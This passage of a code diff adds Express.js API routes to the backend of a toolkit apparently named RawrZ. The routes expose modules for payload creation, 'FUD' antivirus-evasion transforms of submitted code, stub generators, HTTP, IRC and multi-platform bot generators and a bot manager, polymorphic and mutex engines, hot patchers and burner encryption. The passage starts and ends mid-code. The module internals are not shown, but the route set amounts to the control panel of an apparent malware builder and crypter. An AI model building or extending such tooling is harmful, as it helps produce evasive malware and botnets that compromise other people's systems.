+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Implementation Checker specific endpoints
+app.post('/api/implementation-checker/check', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        const result = await realModules.implementationChecker.checkImplementation(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Payload Manager specific endpoints
+app.post('/api/payload-manager/create', requireAuth, async (req, res) => {
+    try {
+        const { type, options = {} } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        const result = await realModules.payloadManager.createPayload(type, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Advanced Analytics Engine specific endpoints
+app.post('/api/advanced-analytics/analyze', requireAuth, async (req, res) => {
+    try {
+        const { data, options = {} } = req.body || {};
+        if (!data) {
+            return res.status(400).json({ error: 'data is required' });
+        }
+        const result = await realModules.advancedAnalyticsEngine.analyze(data, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Advanced FUD Engine specific endpoints
+app.post('/api/advanced-fud/apply-fud', requireAuth, async (req, res) => {
+    try {
+        const { code, language, options = {} } = req.body || {};
+        if (!code || !language) {
+            return res.status(400).json({ error: 'code and language are required' });
+        }
+        const result = await realModules.advancedFUDEngine.applyBasicFUD(code, language, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// AI Threat Detector specific endpoints
+app.post('/api/ai-threat-detector/detect', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        const result = await realModules.aiThreatDetector.detectThreats(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// API Status specific endpoints
+app.get('/api/api-status/check', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.apiStatus.checkStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Backup System specific endpoints
+app.post('/api/backup-system/backup', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        const result = await realModules.backupSystem.createBackup(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// List backups
+app.get('/api/backup-system/list', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.query || {};
+        const result = await realModules.backupSystem.listBackups(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Restore backup
+app.post('/api/backup-system/restore', requireAuth, async (req, res) => {
+    try {
+        const { backupId, destination = null } = req.body || {};
+        if (!backupId) {
+            return res.status(400).json({ error: 'backupId is required' });
+        }
+        const result = await realModules.backupSystem.restoreBackup(backupId, destination);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Get backup settings
+app.get('/api/backup-system/settings', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.backupSystem.getSettings();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Stub Generator configuration endpoints
+app.post('/api/stub-generator/set-openssl-mode', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body;
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean value' });
+        }
+        const result = await realModules.stubGenerator.setOpenSSLMode(enabled);
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/stub-generator/set-custom-algorithms', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body;
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean value' });
+        }
+        const result = await realModules.stubGenerator.setCustomAlgorithms(enabled);
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.get('/api/stub-generator/settings', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.stubGenerator.getSettings();
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Advanced Crypto configuration endpoints
+app.post('/api/advanced-crypto/set-openssl-mode', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body;
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean value' });
+        }
+        const result = await realModules.advancedCrypto.setOpenSSLMode(enabled);
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/advanced-crypto/set-custom-algorithms', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body;
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean value' });
+        }
+        const result = await realModules.advancedCrypto.setCustomAlgorithms(enabled);
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.get('/api/advanced-crypto/settings', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedCrypto.getSettings();
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// OpenSSL Management preset endpoint
+app.post('/api/openssl-management/apply-preset', requireAuth, async (req, res) => {
+    try {
+        const { presetName } = req.body;
+        if (!presetName) {
+            return res.status(400).json({ error: 'presetName is required' });
+        }
+        const result = await realModules.opensslManagement.applyPreset(presetName);
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.get('/api/openssl-management/settings', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getSettings();
+        res.json({ success: true, result });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Dual Generators specific endpoints
+app.post('/api/dual-generators/generate', requireAuth, async (req, res) => {
+    try {
+        const { type, options = {} } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        const result = await realModules.dualGenerators.generate(type, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Full Assembly specific endpoints
+app.post('/api/full-assembly/compile', requireAuth, async (req, res) => {
+    try {
+        const { code, options = {} } = req.body || {};
+        if (!code) {
+            return res.status(400).json({ error: 'code is required' });
+        }
+        const result = await realModules.fullAssembly.compileAssembly(code, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Plugin Architecture specific endpoints
+app.post('/api/plugin-architecture/load', requireAuth, async (req, res) => {
+    try {
+        const { pluginPath, options = {} } = req.body || {};
+        if (!pluginPath) {
+            return res.status(400).json({ error: 'pluginPath is required' });
+        }
+        const result = await realModules.pluginArchitecture.loadPlugin(pluginPath, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Template Generator specific endpoints
+app.post('/api/template-generator/generate', requireAuth, async (req, res) => {
+    try {
+        const { template, options = {} } = req.body || {};
+        if (!template) {
+            return res.status(400).json({ error: 'template is required' });
+        }
+        const result = await realModules.templateGenerator.generateTemplate(template, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Stub Generator specific endpoints
+app.post('/api/stub-generator/generate', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.stubGenerator.generateStub(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Advanced Stub Generator specific endpoints
+app.post('/api/advanced-stub-generator/generate', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.advancedStubGenerator.generateAdvancedStub(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Comprehensive API endpoints for all engines
+
+// rawrzEngine comprehensive API endpoints
+app.get('/api/rawrz-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/rawrz-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/rawrz-engine/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'rawrzEngine',
+            status: 'active',
+            endpoints: [
+                '/api/rawrz-engine/status',
+                '/api/rawrz-engine/initialize',
+                '/api/rawrz-engine/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// rawrzEngine2 comprehensive API endpoints
+app.get('/api/rawrz-engine2/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine2.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/rawrz-engine2/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine2.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/rawrz-engine2/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'rawrzEngine2',
+            status: 'active',
+            endpoints: [
+                '/api/rawrz-engine2/status',
+                '/api/rawrz-engine2/initialize',
+                '/api/rawrz-engine2/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// httpBotGenerator comprehensive API endpoints
+app.get('/api/http-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotGenerator.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/http-bot-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotGenerator.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/http-bot-generator/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'httpBotGenerator',
+            status: 'active',
+            endpoints: [
+                '/api/http-bot-generator/status',
+                '/api/http-bot-generator/initialize',
+                '/api/http-bot-generator/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// httpBotManager comprehensive API endpoints
+app.get('/api/http-bot-manager/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotManager.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/http-bot-manager/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotManager.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/http-bot-manager/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'httpBotManager',
+            status: 'active',
+            endpoints: [
+                '/api/http-bot-manager/status',
+                '/api/http-bot-manager/initialize',
+                '/api/http-bot-manager/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// ircBotGenerator comprehensive API endpoints
+app.get('/api/irc-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.ircBotGenerator.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/irc-bot-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.ircBotGenerator.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/irc-bot-generator/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'ircBotGenerator',
+            status: 'active',
+            endpoints: [
+                '/api/irc-bot-generator/status',
+                '/api/irc-bot-generator/initialize',
+                '/api/irc-bot-generator/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// multiPlatformBotGenerator comprehensive API endpoints
+app.get('/api/multi-platform-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.multiPlatformBotGenerator.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/multi-platform-bot-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.multiPlatformBotGenerator.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/multi-platform-bot-generator/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'multiPlatformBotGenerator',
+            status: 'active',
+            endpoints: [
+                '/api/multi-platform-bot-generator/status',
+                '/api/multi-platform-bot-generator/initialize',
+                '/api/multi-platform-bot-generator/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// hotPatchers comprehensive API endpoints
+app.get('/api/hot-patchers/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.hotPatchers.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/hot-patchers/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.hotPatchers.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/hot-patchers/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'hotPatchers',
+            status: 'active',
+            endpoints: [
+                '/api/hot-patchers/status',
+                '/api/hot-patchers/initialize',
+                '/api/hot-patchers/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// digitalForensics comprehensive API endpoints
+app.get('/api/digital-forensics/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.digitalForensics.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/digital-forensics/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.digitalForensics.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/digital-forensics/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'digitalForensics',
+            status: 'active',
+            endpoints: [
+                '/api/digital-forensics/status',
+                '/api/digital-forensics/initialize',
+                '/api/digital-forensics/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// jottiScanner comprehensive API endpoints
+app.get('/api/jotti-scanner/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.jottiScanner.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/jotti-scanner/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.jottiScanner.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/jotti-scanner/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'jottiScanner',
+            status: 'active',
+            endpoints: [
+                '/api/jotti-scanner/status',
+                '/api/jotti-scanner/initialize',
+                '/api/jotti-scanner/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// privateVirusScanner comprehensive API endpoints
+app.get('/api/private-virus-scanner/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.privateVirusScanner.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/private-virus-scanner/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.privateVirusScanner.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/private-virus-scanner/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'privateVirusScanner',
+            status: 'active',
+            endpoints: [
+                '/api/private-virus-scanner/status',
+                '/api/private-virus-scanner/initialize',
+                '/api/private-virus-scanner/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// burnerEncryption comprehensive API endpoints
+app.get('/api/burner-encryption/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.burnerEncryption.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/burner-encryption/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.burnerEncryption.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/burner-encryption/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'burnerEncryption',
+            status: 'active',
+            endpoints: [
+                '/api/burner-encryption/status',
+                '/api/burner-encryption/initialize',
+                '/api/burner-encryption/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// polymorphicEngine comprehensive API endpoints
+app.get('/api/polymorphic-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.polymorphicEngine.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/polymorphic-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.polymorphicEngine.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/polymorphic-engine/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'polymorphicEngine',
+            status: 'active',
+            endpoints: [
+                '/api/polymorphic-engine/status',
+                '/api/polymorphic-engine/initialize',
+                '/api/polymorphic-engine/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// mutexEngine comprehensive API endpoints
+app.get('/api/mutex-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mutexEngine.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/mutex-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mutexEngine.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/mutex-engine/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'mutexEngine',
+            status: 'active',
+            endpoints: [
+                '/api/mutex-engine/status',
+                '/api/mutex-engine/initialize',
+                '/api/mutex-engine/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// opensslManagement comprehensive API endpoints
+app.get('/api/openssl-management/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/openssl-management/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/openssl-management/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'opensslManagement',
+            status: 'active',
+            endpoints: [
+                '/api/openssl-management/status',
+                '/api/openssl-management/initialize',
+                '/api/openssl-management/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// implementationChecker comprehensive API endpoints
+app.get('/api/implementation-checker/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.implementationChecker.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/implementation-checker/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.implementationChecker.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/implementation-checker/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'implementationChecker',
+            status: 'active',
+            endpoints: [
+                '/api/implementation-checker/status',
+                '/api/implementation-checker/initialize',
+                '/api/implementation-checker/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// payloadManager comprehensive API endpoints
+app.get('/api/payload-manager/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.payloadManager.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/payload-manager/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.payloadManager.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/payload-manager/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'payloadManager',
+            status: 'active',
+            endpoints: [
+                '/api/payload-manager/status',
+                '/api/payload-manager/initialize',
+                '/api/payload-manager/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// advancedAnalyticsEngine comprehensive API endpoints
+app.get('/api/advanced-analytics-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedAnalyticsEngine.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/advanced-analytics-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedAnalyticsEngine.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/advanced-analytics-engine/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'advancedAnalyticsEngine',
+            status: 'active',
+            endpoints: [
+                '/api/advanced-analytics-engine/status',
+                '/api/advanced-analytics-engine/initialize',
+                '/api/advanced-analytics-engine/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// advancedFUDEngine comprehensive API endpoints
+app.get('/api/advanced-f-u-d-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedFUDEngine.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/advanced-f-u-d-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedFUDEngine.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/advanced-f-u-d-engine/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'advancedFUDEngine',
+            status: 'active',
+            endpoints: [
+                '/api/advanced-f-u-d-engine/status',
+                '/api/advanced-f-u-d-engine/initialize',
+                '/api/advanced-f-u-d-engine/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// aiThreatDetector comprehensive API endpoints
+app.get('/api/ai-threat-detector/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.aiThreatDetector.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/ai-threat-detector/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.aiThreatDetector.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/ai-threat-detector/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'aiThreatDetector',
+            status: 'active',
+            endpoints: [
+                '/api/ai-threat-detector/status',
+                '/api/ai-threat-detector/initialize',
+                '/api/ai-threat-detector/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// apiStatus comprehensive API endpoints
+app.get('/api/api-status/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.apiStatus.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/api-status/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.apiStatus.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/api-status/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'apiStatus',
+            status: 'active',
+            endpoints: [
+                '/api/api-status/status',
+                '/api/api-status/initialize',
+                '/api/api-status/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// backupSystem comprehensive API endpoints
+app.get('/api/backup-system/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.backupSystem.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/backup-system/initialize', requireAuth, async (req, res) => {
